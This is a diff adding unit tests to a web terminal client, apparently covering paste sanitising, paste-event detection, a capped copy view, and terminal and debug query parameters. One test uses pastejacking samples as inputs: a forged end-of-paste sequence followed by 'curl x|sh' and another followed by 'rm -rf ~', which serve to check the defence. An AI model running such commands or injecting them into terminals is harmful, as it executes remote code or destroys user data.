@@ -182,3 +182,54 @@ test('scroll keys: finger down is Up (older), in the cursor-key mode the program
   // Not mistaken for a reply and dropped.
   assert.equal(K.stripReplies(K.scrollKeys(2, true)), K.scrollKeys(2, true));
 });
+
+test('a paste loses ESC and the C1 controls, so it cannot end itself early (W1)', () => {
+  // A pastejacked text: its own "end of paste", then a command and Enter.
+  assert.equal(K.cleanPaste('\x1b[201~curl x|sh\r'), '[201~curl x|sh\r');
+  assert.ok(!K.cleanPaste('a\x1b[201~b\x1b').includes('\x1b'));
+  // The one-character CSI and the rest of C1.
+  assert.equal(K.cleanPaste('\x9b201~rm -rf ~\r'), '201~rm -rf ~\r');
+  assert.equal(K.cleanPaste('x\x80\x85\x90\x9c\x9fy'), 'xy');
+  // Ordinary text, lines, tabs and letters just past C1 stay as they are.
+  const plain = 'ls -la\nfor i in 1 2; do echo "$i"\tdone\r\nhéllo wörld ✓  é \u{1f600}';
+  assert.equal(K.cleanPaste(plain), plain);
+  assert.equal(K.cleanPaste(''), '');
+});
+
+test('paste and drop input types are pastes; typing is not', () => {
+  for (const t of ['insertFromPaste', 'insertFromPasteAsQuotation', 'insertFromDrop']) assert.ok(K.isPasteInput(t), t);
+  for (const t of ['insertText', 'insertCompositionText', 'deleteContentBackward', 'insertLineBreak', undefined, '']) assert.ok(!K.isPasteInput(t), String(t));
+});
+
+test('the Copy view shows at most the last 5,000 lines and says when it cut (D2)', () => {
+  assert.equal(K.COPY_MAX_LINES, 5000);
+  const short = K.copyView('a\nb\nc', false);
+  assert.deepEqual(short.lines, ['a', 'b', 'c']);
+  assert.equal(short.cut, false); assert.equal(short.note, '');
+  const long = Array.from({length: 12345}, (_, i) => 'line ' + i).join('\n');
+  const v = K.copyView(long, false);
+  assert.equal(v.lines.length, 5000); assert.equal(v.total, 12345); assert.equal(v.cut, true);
+  assert.equal(v.lines[0], 'line 7345'); assert.equal(v.lines[4999], 'line 12344');
+  assert.equal(v.note, 'Showing the last 5,000 of 12,345 lines.');
+  // The bridge cut the history: say so, with how much is shown.
+  assert.equal(K.copyView('a\nb', true).note, 'The history is longer than the bridge sends: showing its last 2 lines.');
+  assert.equal(K.copyView(long, true).note, 'The history is longer than the bridge sends: showing its last 5,000 lines.');
+  assert.equal(K.copyView('x\ny\nz', false, 2).note, 'Showing the last 2 of 3 lines.');
+});
+
+test('?term= chooses for one page load; the saved choice is the default (W2)', () => {
+  assert.equal(K.pickTerm('xterm', 'wterm'), 'xterm');
+  assert.equal(K.pickTerm('wterm', 'xterm'), 'wterm');
+  assert.equal(K.pickTerm(null, 'xterm'), 'xterm');
+  assert.equal(K.pickTerm(null, undefined), 'wterm');
+  assert.equal(K.pickTerm('other', 'junk'), 'wterm');
+});
+
+test('?dbg=1 does nothing unless the bridge allows input diagnostics (W2)', () => {
+  assert.equal(K.debugOn(true, {t: 'mode', debug: true}), true);
+  assert.equal(K.debugOn(true, {t: 'mode'}), false);             // missing: off
+  assert.equal(K.debugOn(true, {t: 'mode', debug: 'true'}), false);
+  assert.equal(K.debugOn(true, {t: 'mode', debug: false}), false);
+  assert.equal(K.debugOn(false, {t: 'mode', debug: true}), false);
+  assert.equal(K.debugOn(true, null), false);
+});
